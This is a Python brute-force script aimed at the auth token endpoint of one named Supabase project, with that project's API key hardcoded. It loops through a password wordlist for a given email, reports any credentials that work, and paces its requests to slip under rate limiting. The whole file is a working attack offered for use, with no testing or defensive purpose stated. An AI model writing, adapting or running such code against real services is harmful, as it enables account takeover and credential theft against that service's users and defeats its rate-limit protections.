import requests
import json
import time
import sys

# Configuration
target_url = "https://suwzslcvitjudebflstl.supabase.co/auth/v1/token"
api_key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN1d3pzbGN2aXRqdWRlYmZsc3RsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk5ODk2NDcsImV4cCI6MjA4NTU2NTY0N30.-w5F_5RdOcgPfsyC6qFaLFv6LLFzBiBaLiOm4B7JVVo"
headers = {
    "Content-Type": "application/json",
    "Authorization": f"Bearer {api_key}",
    "X-Supabase-Api-Version": "2024-01-01",
    "X-Client-Info": "supabase-js-web/2.93.3"
}

def load_wordlist(wordlist_path):
    """Load wordlist from file"""
    try:
        with open(wordlist_path, 'r') as f:
            return [line.strip() for line in f]
    except Exception as e:
        print(f"Error loading wordlist: {e}")
        sys.exit(1)

def brute_force(email, passwords):
    """Perform brute force attack"""
    for password in passwords:
        payload = {
            "email": email,
            "password": password,
            "gotrue_meta_security": {}
        }
        
        response = requests.post(
            target_url,
            headers=headers,
            data=json.dumps(payload)
        )
        
        # Check if successful (status code 200 or 201)
        if response.status_code in [200, 201]:
            print(f"[+] Success! Email: {email}, Password: {password}")
            print(f"Response: {response.text}")
            return True
            
        # Rate limiting - sleep to avoid blocking
        time.sleep(0.1)
    
    print("[-] Brute force completed without finding valid credentials")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python brute_force.py <email> <wordlist.txt>")
        sys.exit(1)
    
    email = sys.argv[1]
    wordlist_path = sys.argv[2]
    
    passwords = load_wordlist(wordlist_path)
    brute_force(email, passwords)
